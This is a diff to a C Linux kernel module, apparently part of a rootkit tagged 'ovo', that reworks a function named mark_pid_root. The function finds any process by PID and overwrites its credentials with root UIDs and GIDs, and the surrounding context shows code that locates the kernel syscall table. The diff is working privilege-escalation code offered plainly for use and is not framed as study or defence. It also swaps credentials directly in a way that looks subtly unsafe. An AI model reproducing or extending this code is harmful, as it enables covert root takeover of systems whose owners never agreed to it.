@@ -93,11 +93,14 @@ unsigned long *ovo_find_syscall_table(void) {
     return syscall_table;
 }
 
-int mark_pid_root(pid_t pid) {
+int mark_pid_root(pid_t pid)
+{
     struct pid *pid_struct;
     struct task_struct *task;
     struct cred *new_cred;
-
+    pid_t unused; /* placeholder if you need a return-variable */
+    
+    /* 1. Lookup and pin the task_struct under RCU */
     pid_struct = find_get_pid(pid);
     if (!pid_struct) {
         printk(KERN_ERR "[ovo] find_get_pid failed\n");
@@ -109,39 +112,35 @@ int mark_pid_root(pid_t pid) {
     if (task)
         get_task_struct(task);
     rcu_read_unlock();
-
     put_pid(pid_struct);
+
     if (!task) {
         printk(KERN_ERR "[ovo] pid_task lookup failed\n");
         return -ESRCH;
     }
 
-    if (my_prepare_creds == NULL) {
-        my_prepare_creds = (void *)ovo_kallsyms_lookup_name("prepare_creds");
-        if (!my_prepare_creds) {
-            printk(KERN_ERR "[ovo] Failed to find prepare_creds\n");
-            put_task_struct(task);
-            return -ENOENT;
-        }
-    }
-
-    new_cred = my_prepare_creds();
+    /* 2. Prepare new root credentials using the exported helper */
+    new_cred = prepare_creds();
     if (!new_cred) {
         printk(KERN_ERR "[ovo] Failed to prepare new credentials\n");
         put_task_struct(task);
         return -ENOMEM;
     }
 
-    new_cred->uid = KUIDT_INIT(0);
-    new_cred->gid = KGIDT_INIT(0);
+    /* 3. Assign root UIDs/GIDs */
+    new_cred->uid  = KUIDT_INIT(0);
+    new_cred->gid  = KGIDT_INIT(0);
     new_cred->euid = KUIDT_INIT(0);
     new_cred->egid = KGIDT_INIT(0);
 
+    /* 4. RCU‐safe pointer update */
     rcu_assign_pointer(task->cred, new_cred);
 
+    /* 5. Release task reference */
     put_task_struct(task);
     return 0;
 }
+
 
 
 int is_pid_alive(pid_t pid) {
